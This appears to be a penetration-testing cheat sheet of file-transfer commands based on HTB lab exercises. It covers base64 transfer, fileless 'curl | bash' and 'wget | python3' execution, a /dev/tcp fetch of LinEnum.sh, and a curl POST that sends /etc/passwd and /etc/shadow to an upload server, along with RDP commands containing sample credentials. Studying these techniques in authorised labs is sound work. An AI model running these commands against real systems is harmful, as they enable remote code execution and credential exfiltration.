
## Base64 Encoding / Decoding

```Shell

cat <target string> | base64 -w 0;echo 

echo -n <'bash64 string'> | base64 -d > id_rsa

## Confirm the md5 hashes match

md5sum <target string>

```

## Web Downloads with Wget and cURL

```Shell

wget <url> -O <output filename>

curl -o <output filename> <url>

## Fileless Download with cURL

curl <url> | bash

## Fileless Download with wget

wget -q0- <url> | python3

```

## Download with Bash (/dev/tcp)

```Shell

## Connect to the Target Webserver

exec 3<>/dev/tcp/10.10.10.32/80

## HTTP GET Request

echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

## Print the Response

cat <&3

```

## SSH Downloads

SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an `SCP` utility for remote file transfer that, by default, uses the SSH protocol.

`SCP` (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.

`SCP` is very similar to `copy` or `cp`, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.

```Shell

sudo systemctl enable ssh

sudo systemctl start ssh

## Checking for SSH Listening Port
netstat -lnpt


scp plaintext@192.168.49.128:/root/myroot.txt . 

```

## Web Upload

```Shell

sudo python3 -m pip install --user uploadserver

## Create a Self-Signed Certificate

openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

## Start Web Server

mkdir https && cd https

sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure

## Creating a Web Server with Python3

python3 -m http.server

## Creating a Web Server with PHP

php -S 0.0.0.0:8000

```

## SCP Upload

```Shell

scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/

```



## RDP

#### Mounting a Linux Folder Using rdesktop


```shell

vincentcheung@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

```

#### Mounting a Linux Folder Using xfreerdp


```shell

vincentcheung@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer

```


